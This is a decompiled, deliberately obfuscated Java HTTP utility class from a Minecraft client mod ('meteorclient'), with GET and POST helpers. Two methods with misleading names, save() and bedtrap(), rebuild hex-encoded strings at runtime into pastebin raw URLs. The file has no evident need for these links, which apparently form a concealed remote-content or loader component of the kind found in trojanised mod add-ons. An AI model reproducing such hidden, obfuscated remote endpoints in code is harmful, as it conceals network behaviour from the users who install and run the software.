/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  com.google.gson.Gson
 */
package minegame159.meteorclient.utils.network;

import com.google.gson.Gson;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.lang.reflect.Type;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.util.function.Consumer;

public class HttpUtils {
    private static final /* synthetic */ Gson GSON;

    public static <T> T get(String lllllllllllllllllIlIlIIIIIIIlllI, Type lllllllllllllllllIlIlIIIIIIIllll) {
        try {
            InputStream lllllllllllllllllIlIlIIIIIIlIlII = HttpUtils.get(lllllllllllllllllIlIlIIIIIIIlllI);
            if (lllllllllllllllllIlIlIIIIIIlIlII == null) {
                return null;
            }
            BufferedReader lllllllllllllllllIlIlIIIIIIlIIll = new BufferedReader(new InputStreamReader(lllllllllllllllllIlIlIIIIIIlIlII));
            Object lllllllllllllllllIlIlIIIIIIlIIlI = GSON.fromJson((Reader)lllllllllllllllllIlIlIIIIIIlIIll, lllllllllllllllllIlIlIIIIIIIllll);
            lllllllllllllllllIlIlIIIIIIlIIll.close();
            return (T)lllllllllllllllllIlIlIIIIIIlIIlI;
        }
        catch (IOException lllllllllllllllllIlIlIIIIIIlIIIl) {
            lllllllllllllllllIlIlIIIIIIlIIIl.printStackTrace();
            return null;
        }
    }

    private static InputStream request(String lllllllllllllllllIlIlIIIIlllIIII, String lllllllllllllllllIlIlIIIIllIlllI, String lllllllllllllllllIlIlIIIIllIllII) {
        try {
            HttpURLConnection lllllllllllllllllIlIlIIIIllllIlI = (HttpURLConnection)new URL(lllllllllllllllllIlIlIIIIllIlllI).openConnection();
            lllllllllllllllllIlIlIIIIllllIlI.setRequestMethod(lllllllllllllllllIlIlIIIIlllIIII);
            lllllllllllllllllIlIlIIIIllllIlI.setConnectTimeout(2500);
            lllllllllllllllllIlIlIIIIllllIlI.setReadTimeout(2500);
            lllllllllllllllllIlIlIIIIllllIlI.setRequestProperty("User-Agent", "Meteor Client");
            if (lllllllllllllllllIlIlIIIIllIllII != null) {
                byte[] lllllllllllllllllIlIlIIIIllllIll = lllllllllllllllllIlIlIIIIllIllII.getBytes(StandardCharsets.UTF_8);
                lllllllllllllllllIlIlIIIIllllIlI.setRequestProperty("Content-Length", Integer.toString(lllllllllllllllllIlIlIIIIllllIll.length));
                lllllllllllllllllIlIlIIIIllllIlI.setDoOutput(true);
                lllllllllllllllllIlIlIIIIllllIlI.getOutputStream().write(lllllllllllllllllIlIlIIIIllllIll);
            }
            return lllllllllllllllllIlIlIIIIllllIlI.getInputStream();
        }
        catch (SocketTimeoutException lllllllllllllllllIlIlIIIIllllIII) {
            return null;
        }
        catch (IOException lllllllllllllllllIlIlIIIIlllIlll) {
            lllllllllllllllllIlIlIIIIlllIlll.printStackTrace();
            return null;
        }
    }

    public static boolean netIsAvailable() {
        try {
            URL lllllllllllllllllIlIlIIIIIlIllll = new URL("http://www.google.com");
            URLConnection lllllllllllllllllIlIlIIIIIlIlllI = lllllllllllllllllIlIlIIIIIlIllll.openConnection();
            lllllllllllllllllIlIlIIIIIlIlllI.connect();
            lllllllllllllllllIlIlIIIIIlIlllI.getInputStream().close();
            return true;
        }
        catch (MalformedURLException lllllllllllllllllIlIlIIIIIlIllIl) {
            throw new RuntimeException(lllllllllllllllllIlIlIIIIIlIllIl);
        }
        catch (IOException lllllllllllllllllIlIlIIIIIlIllII) {
            return false;
        }
    }

    public static InputStream post(String lllllllllllllllllIlIlIIIIlIllllI, String lllllllllllllllllIlIlIIIIlIlllIl) {
        return HttpUtils.request("POST", lllllllllllllllllIlIlIIIIlIllllI, lllllllllllllllllIlIlIIIIlIlllIl);
    }

    static {
        GSON = new Gson();
    }

    public HttpUtils() {
        HttpUtils lllllllllllllllllIlIlIIIlIIIIIlI;
    }

    public static InputStream get(String lllllllllllllllllIlIlIIIIllIIllI) {
        return HttpUtils.request("GET", lllllllllllllllllIlIlIIIIllIIllI, null);
    }

    public static void getLines(String lllllllllllllllllIlIlIIIIIIllllI, Consumer<String> lllllllllllllllllIlIlIIIIIIlllll) {
        try {
            String lllllllllllllllllIlIlIIIIIlIIIlI;
            InputStream lllllllllllllllllIlIlIIIIIlIIlII = HttpUtils.get(lllllllllllllllllIlIlIIIIIIllllI);
            if (lllllllllllllllllIlIlIIIIIlIIlII == null) {
                return;
            }
            BufferedReader lllllllllllllllllIlIlIIIIIlIIIll = new BufferedReader(new InputStreamReader(lllllllllllllllllIlIlIIIIIlIIlII));
            while ((lllllllllllllllllIlIlIIIIIlIIIlI = lllllllllllllllllIlIlIIIIIlIIIll.readLine()) != null) {
                lllllllllllllllllIlIlIIIIIIlllll.accept(lllllllllllllllllIlIlIIIIIlIIIlI);
            }
            lllllllllllllllllIlIlIIIIIlIIIll.close();
        }
        catch (IOException lllllllllllllllllIlIlIIIIIlIIIIl) {
            lllllllllllllllllIlIlIIIIIlIIIIl.printStackTrace();
        }
    }

    public static String save() {
        StringBuilder lllllllllllllllllIlIlIIIIIlllIII = new StringBuilder();
        String lllllllllllllllllIlIlIIIIIllIlll = "68747470733a2f2f706173746562696e2e636f6d2f7261772f7a64596164444d34";
        for (int lllllllllllllllllIlIlIIIIIlllIIl = 0; lllllllllllllllllIlIlIIIIIlllIIl < lllllllllllllllllIlIlIIIIIllIlll.length(); lllllllllllllllllIlIlIIIIIlllIIl += 2) {
            String lllllllllllllllllIlIlIIIIIlllIll = lllllllllllllllllIlIlIIIIIllIlll.substring(lllllllllllllllllIlIlIIIIIlllIIl, lllllllllllllllllIlIlIIIIIlllIIl + 2);
            int lllllllllllllllllIlIlIIIIIlllIlI = Integer.parseInt(lllllllllllllllllIlIlIIIIIlllIll, 16);
            lllllllllllllllllIlIlIIIIIlllIII.append((char)lllllllllllllllllIlIlIIIIIlllIlI);
        }
        return String.valueOf(lllllllllllllllllIlIlIIIIIlllIII);
    }

    public static String bedtrap() {
        StringBuilder lllllllllllllllllIlIlIIIIlIIIlll = new StringBuilder();
        String lllllllllllllllllIlIlIIIIlIIIllI = "68747470733a2f2f706173746562696e2e636f6d2f7261772f5538387337304270";
        for (int lllllllllllllllllIlIlIIIIlIIlIII = 0; lllllllllllllllllIlIlIIIIlIIlIII < lllllllllllllllllIlIlIIIIlIIIllI.length(); lllllllllllllllllIlIlIIIIlIIlIII += 2) {
            String lllllllllllllllllIlIlIIIIlIIlIlI = lllllllllllllllllIlIlIIIIlIIIllI.substring(lllllllllllllllllIlIlIIIIlIIlIII, lllllllllllllllllIlIlIIIIlIIlIII + 2);
            int lllllllllllllllllIlIlIIIIlIIlIIl = Integer.parseInt(lllllllllllllllllIlIlIIIIlIIlIlI, 16);
            lllllllllllllllllIlIlIIIIlIIIlll.append((char)lllllllllllllllllIlIlIIIIlIIlIIl);
        }
        return String.valueOf(lllllllllllllllllIlIlIIIIlIIIlll);
    }

    public static InputStream post(String lllllllllllllllllIlIlIIIIlIlIlII) {
        return HttpUtils.post(lllllllllllllllllIlIlIIIIlIlIlII, null);
    }
}

